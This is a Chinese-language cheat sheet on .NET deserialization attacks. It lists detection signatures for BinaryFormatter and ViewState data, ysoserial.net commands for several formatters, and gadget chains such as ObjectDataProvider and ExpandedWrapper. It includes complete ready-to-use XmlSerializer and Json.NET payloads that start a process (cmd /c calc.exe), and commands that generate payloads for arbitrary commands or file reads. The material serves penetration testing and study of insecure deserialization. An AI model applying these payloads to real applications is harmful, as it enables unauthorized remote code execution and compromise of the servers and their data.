# .NET 反序列化

>.NET 序列化是将对象的状态转换为可以轻松存储或传输的格式（如 XML、JSON 或二进制）的过程。然后，该序列化数据可以保存到文件中、通过网络发送或存储在数据库中。之后，它可以被反序列化以重建原始对象及其完整数据。序列化在 .NET 中广泛用于任务，如缓存、应用程序间的数据传输和会话状态管理。

## 概述

* [检测](#检测)
* [工具](#工具)
* [格式化程序](#格式化程序)
    * [XmlSerializer](#xmlserializer)
    * [DataContractSerializer](#datacontractserializer)
    * [NetDataContractSerializer](#netdatacontractserializer)
    * [LosFormatter](#losformatter)
    * [JSON.NET](#jsonnet)
    * [BinaryFormatter](#binaryformatter)
* [POP 小工具](#pop小工具)
* [参考](#参考)

## 检测

| 数据           | 描述         |
| -------------- | ------------------- |
| `AAEAAD` (十六进制) | .NET BinaryFormatter |
| `FF01` (十六进制)   | .NET ViewState |
| `/w` (Base64)   | .NET ViewState |

示例: `AAEAAAD/////AQAAAAAAAAAMAgAAAF9TeXN0ZW0u[...]0KPC9PYmpzPgs=`

## 工具

* [pwntester/ysoserial.net - 多种 .NET 格式化程序的反序列化有效载荷生成器](https://github.com/pwntester/ysoserial.net)

```ps1
cat my_long_cmd.txt | ysoserial.exe -o raw -g WindowsIdentity -f Json.Net -s
./ysoserial.exe -p DotNetNuke -m read_file -f win.ini
./ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "calc" -t
./ysoserial.exe -f BinaryFormatter -g PSObject -o base64 -c "calc" -t
```

## 格式化程序

![NETNativeFormatters.png](https://github.com/swisskyrepo/PayloadsAllTheThings/raw/master/Insecure%20Deserialization/Images/NETNativeFormatters.png?raw=true)
来自 [pwntester/attacking-net-serialization](https://speakerdeck.com/pwntester/attacking-net-serialization?slide=15) 的 .NET 原生格式化程序

### XmlSerializer

* 在 C# 源代码中查找 `XmlSerializer(typeof(<TYPE>));`。
* 攻击者必须控制 XmlSerializer 的 **类型**。
* 有效负载输出: **XML**

```xml
.\ysoserial.exe -g ObjectDataProvider -f XmlSerializer -c "calc.exe"
<?xml version="1.0"?>
<root type="System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089">
    <ExpandedWrapperOfXamlReaderObjectDataProvider xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" >
        <ExpandedElement/>
        <ProjectedProperty0>
            <MethodName>Parse</MethodName>
            <MethodParameters>
                <anyType xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xsi:type="xsd:string">
                    <![CDATA[<ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:d="http://schemas.microsoft.com/winfx/2006/xaml" xmlns:b="clr-namespace:System;assembly=mscorlib" xmlns:c="clr-namespace:System.Diagnostics;assembly=system"><ObjectDataProvider d:Key="" ObjectType="{d:Type c:Process}" MethodName="Start"><ObjectDataProvider.MethodParameters><b:String>cmd</b:String><b:String>/c calc.exe</b:String></ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>]]>
                </anyType>
            </MethodParameters>
            <ObjectInstance xsi:type="XamlReader"></ObjectInstance>
        </ProjectedProperty0>
    </ExpandedWrapperOfXamlReaderObjectDataProvider>
</root>
```

### DataContractSerializer

> DataContractSerializer 以松散耦合的方式反序列化。它从传入的数据中永远不会读取通用语言运行时 (CLR) 类型和程序集名称。XmlSerializer 的安全模型与 DataContractSerializer 类似，主要区别在于细节。例如，使用 XmlIncludeAttribute 属性而不是 KnownTypeAttribute 属性进行类型包含。

* 在 C# 源代码中查找 `DataContractSerializer(typeof(<TYPE>))`。
* 有效负载输出: **XML**
* 数据 **类型** 必须由用户控制才能利用

### NetDataContractSerializer

> 它扩展了 `System.Runtime.Serialization.XmlObjectSerializer` 类，并能够序列化任何带有可序列化属性标记的类型为 `BinaryFormatter`。

* 在 C# 源代码中查找 `NetDataContractSerializer().ReadObject()`。
* 有效负载输出: **XML**

```ps1
.\ysoserial.exe -f NetDataContractSerializer -g TypeConfuseDelegate -c "calc.exe" -o base64 -t
```

### LosFormatter

* 内部使用 `BinaryFormatter`。

```ps1
.\ysoserial.exe -f LosFormatter -g TypeConfuseDelegate -c "calc.exe" -o base64 -t
```

### JSON.NET

* 在 C# 源代码中查找 `JsonConvert.DeserializeObject<Expected>(json, new JsonSerializerSettings`。
* 有效负载输出: **JSON**

```ps1
.\ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "calc.exe" -t
{
    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35', 
    'MethodName':'Start',
    'MethodParameters':{
        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
        '$values':['cmd', '/c calc.exe']
    },
    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
}
```

### BinaryFormatter

> BinaryFormatter 类型是危险的，不建议用于数据处理。即使应用程序认为正在处理的数据是可信的，也应尽快停止使用 BinaryFormatter。BinaryFormatter 不安全，无法使其安全。

* 在 C# 源代码中查找 `System.Runtime.Serialization.Binary.BinaryFormatter`。
* 利用需要 `[Serializable]` 或 `ISerializable` 接口。
* 有效负载输出: **二进制**

```ps1
./ysoserial.exe -f BinaryFormatter -g PSObject -o base64 -c "calc" -t
```

## POP 小工具

这些小工具必须具有以下特性：

* 可序列化
* 公有/可设置变量
* 魔法函数：Get/Set、OnSerialisation、构造函数/析构函数

您必须为特定的 **格式化程序** 精心选择您的 **小工具**。

常用的有效负载中使用的流行小工具列表。

* **ObjectDataProvider** 来自 `C:\Windows\Microsoft.NET\Framework\v4.0.30319\WPF\PresentationFramework.dll`
    * 使用 `MethodParameters` 设置任意参数
    * 使用 `MethodName` 调用任意函数
* **ExpandedWrapper**
    * 指定封装对象的 **对象类型**

    ```cs
    ExpandedWrapper<Process, ObjectDataProvider> myExpWrap = new ExpandedWrapper<Process, ObjectDataProvider>();
    ```

* **System.Configuration.Install.AssemblyInstaller**
    * 使用 Assembly.Load 执行有效负载

    ```cs
    // System.Configuration.Install.AssemblyInstaller
    public void set_Path(string value){
        if (value == null){
            this.assembly = null;
        }
        this.assembly = Assembly.LoadFrom(value);
    }
    ```

## 参考

* [ARE YOU MY TYPE? Breaking .NET sandboxes through Serialization - Slides - James Forshaw - September 20, 2012](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_Slides.pdf)
* [ARE YOU MY TYPE? Breaking .NET sandboxes through Serialization - White Paper - James Forshaw - September 20, 2012](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf)
* [Attacking .NET Deserialization - Alvaro Muñoz - April 28, 2018](https://youtu.be/eDfGpu3iE4Q)
* [Attacking .NET Serialization - Alvaro - October 20, 2017](https://speakerdeck.com/pwntester/attacking-net-serialization?slide=11)
* [Basic .Net deserialization (ObjectDataProvider gadget, ExpandedWrapper, and Json.Net) - HackTricks - July 18, 2024](https://book.hacktricks.xyz/pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net)
* [Bypassing .NET Serialization Binders - Markus Wulftange - June 28, 2022](https://codewhitesec.blogspot.com/2022/06/bypassing-dotnet-serialization-binders.html)
* [Exploiting Deserialisation in ASP.NET via ViewState - Soroush Dalili (@irsdl) - April 23, 2019](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)
* [Finding a New DataContractSerializer RCE Gadget Chain - dugisec - November 7, 2019](https://muffsec.com/blog/finding-a-new-datacontractserializer-rce-gadget-chain/)
* [Friday the 13th: JSON Attacks - DEF CON 25 Conference - Alvaro Muñoz (@pwntester) and Oleksandr Mirosh - July 22, 2017](https://www.youtube.com/watch?v=ZBfBYoK_Wr0)
* [Friday the 13th: JSON Attacks - Slides - Alvaro Muñoz (@pwntester) and Oleksandr Mirosh - July 22, 2017](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* [Friday the 13th: JSON Attacks - White Paper - Alvaro Muñoz (@pwntester) and Oleksandr Mirosh - July 22, 2017](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)
* [Now You Serial, Now You Don't - Systematically Hunting for Deserialization Exploits - Alyssa Rahman - December 13, 2021](https://www.mandiant.com/resources/blog/hunting-deserialization-exploits)
* [Sitecore Experience Platform Pre-Auth RCE - CVE-2021-42237 - Shubham Shah - November 2, 2021](https://blog.assetnote.io/2021/11/02/sitecore-rce/)